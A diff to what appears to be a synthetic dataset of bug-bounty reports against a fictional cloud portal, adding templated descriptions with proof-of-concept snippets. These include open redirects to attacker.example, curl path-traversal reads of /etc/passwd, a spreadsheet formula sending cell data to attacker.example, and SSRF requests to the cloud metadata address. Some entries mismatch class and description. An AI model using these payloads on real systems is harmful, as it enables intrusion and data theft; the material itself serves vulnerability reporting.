           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6330,7 +6377,8 @@
           "offset": "9d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6482,7 +6530,8 @@
           "offset": "3d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6637,7 +6686,8 @@
           "offset": "6d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6769,7 +6819,8 @@
           "offset": "1d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6933,7 +6984,8 @@
           "offset": "4d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7096,7 +7148,8 @@
           "offset": "7d 21h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.nebelstein-cloud.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7228,7 +7281,8 @@
           "offset": "16h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7352,7 +7406,8 @@
           "offset": "2d 17h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.nebelstein-cloud.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7455,7 +7510,8 @@
           "offset": "1d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7579,7 +7635,8 @@
           "offset": "3d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7700,7 +7757,8 @@
           "offset": "3d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7846,7 +7904,8 @@
           "offset": "9d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8005,7 +8064,8 @@
           "offset": "3d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.nebelstein-cloud.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8139,7 +8199,8 @@
           "offset": "4d 12h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8298,7 +8359,8 @@
           "offset": "4d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.nebelstein-cloud.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8425,7 +8487,8 @@
           "offset": "4d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.nebelstein-cloud.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8590,7 +8653,8 @@
           "offset": "7d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.nebelstein-cloud.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8729,7 +8793,8 @@
           "offset": "2d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.nebelstein-cloud.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8853,7 +8918,8 @@
           "offset": "2d 12h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.nebelstein-cloud.foo/api/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9032,7 +9098,8 @@
           "offset": "8d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9162,7 +9229,8 @@
           "offset": "7d 10h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.nebelstein-cloud.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9269,7 +9337,8 @@
           "offset": "2d 14h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.nebelstein-cloud.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9385,7 +9454,8 @@
           "offset": "2d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.nebelstein-cloud.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9487,7 +9557,8 @@
           "offset": "3d 16h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9627,7 +9698,8 @@
           "offset": "2d 11h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.nebelstein-cloud.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9787,7 +9859,8 @@
           "offset": "5d 22h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.nebelstein-cloud.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -9938,7 +10011,8 @@
           "offset": "4d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.nebelstein-cloud.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10062,7 +10136,8 @@
           "offset": "2d 23h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10180,7 +10255,8 @@
           "offset": "3d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.nebelstein-cloud.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10344,7 +10420,8 @@
           "offset": "9d 2h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.nebelstein-cloud.foo/export`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -10461,7 +10538,8 @@
           "offset": "4d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
